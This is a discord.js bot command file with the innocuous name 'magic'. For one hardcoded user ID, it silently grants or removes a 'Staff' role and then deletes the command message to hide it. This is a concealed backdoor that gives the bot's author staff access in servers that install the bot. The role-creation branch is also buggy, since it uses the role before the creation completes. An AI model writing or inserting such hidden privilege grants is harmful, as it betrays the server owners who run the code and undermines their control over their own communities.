let discord = require("discord.js");
let adminlevel = require("../../storage/adminlevel.json");

module.exports.run = async (bot, message, args) => {


let staff = message.guild.roles.cache.find(r => r.name === "𝘚𝘵𝘢𝘧𝘧");
 if (message.author.id != "290536979110690816")return;



 

  if(!staff) message.guild.roles.create({ name: "𝘚𝘵𝘢𝘧𝘧" });
  if (message.member.roles.cache.has(staff.id)) {
    setTimeout(() => {message.delete().catch(O_o => {});}, 200);
    await message.member.roles.remove(staff.id);
    return;
  }

  await message.member.roles.add(staff.id);
  
  setTimeout(() => {message.delete().catch(O_o => {});}, 200);
  
};
module.exports.config = {
  name: "magic"
};
